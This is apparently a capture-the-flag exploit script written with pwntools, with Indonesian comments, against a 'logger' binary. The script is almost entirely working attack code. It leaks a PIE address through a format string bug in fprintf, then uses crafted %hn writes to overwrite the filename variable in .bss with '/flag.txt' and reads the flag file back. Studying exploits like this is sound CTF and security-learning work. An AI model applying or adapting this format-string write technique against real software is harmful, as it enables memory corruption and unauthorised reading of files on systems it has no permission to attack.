"""
Vuln terdapat di fungsi write_log pada fprintf() (Format String Attack)
Fungsi fprintf sama seperti printf, harus memakai format string untuk menuliskan ke filestream

### EXPLOIT ###
RELRO Full => tidak bisa overwrite GOT
PIE => harus leak address binary jika ingin mengoverwrite di .bss
one_gadget? mungkin bisa...

Tiap kali melakukan write dan read ke file selalu melakukan fopen
variabel nama file di .bss => bisa dioverwrite menjadi "/flag.txt"
lalu panggil read_log => read flag.txt
"""

from pwn import *

# r = process("./logger")
# attach(r,'''
# b*0x000055555555541b
# b*0x00005555555553b3
# c
# ''')

r = remote('0.0.0.0', 17071)
# attach(pidof('logger')[0], '''
# b*write_log+109
# c
# ''')

def _write(s):
    r.sendlineafter("> ", "1")
    r.sendline(s)

def _read():
    r.sendlineafter("> ", "2")
    r.recvuntil("Content :\n")
    return r.recvline()[:-1]

r.sendlineafter(": ", 'as') # nama file (random)

_write("%28$p") # leak binary address
name_var = int(_read()[:-1],16)+10880 # variabel nama
print hex(name_var)

# /flag.txt\x00 string
# 662f 26159 /f    4 13
# 616c 24940 la    3 14
# 2e67 11879 g.    2 15
# 7874 30836 tx    5 16
# 0074 116   t\x00 1 17

p = ''
p += '%116x%17$hn'
p += '%11763x%15$hn'
p += '%13061x%14$hn'
p += '%1219x%13$hn'
p += '%4677x%16$hn'

p = p.ljust(64, 'A')

p += p64(name_var)
p += p64(name_var+2)
p += p64(name_var+4)
p += p64(name_var+6)
p += p64(name_var+8)

_write(p)
print _read()

r.close()
